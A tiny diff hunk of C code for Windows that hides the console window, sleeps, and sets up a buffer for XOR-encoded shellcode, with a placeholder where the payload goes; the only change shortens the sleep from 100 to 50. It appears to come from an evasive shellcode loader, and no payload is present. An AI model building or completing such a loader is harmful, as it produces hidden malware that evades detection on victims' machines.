@@ -4,7 +4,7 @@
 int main(int argc, char **argv) {
 
 ShowWindow(GetConsoleWindow(), SW_HIDE);
-sleep(100);
+sleep(50);
 char b[] = { Paste the XORED SHELL CODE };
 
 char c[sizeof b];
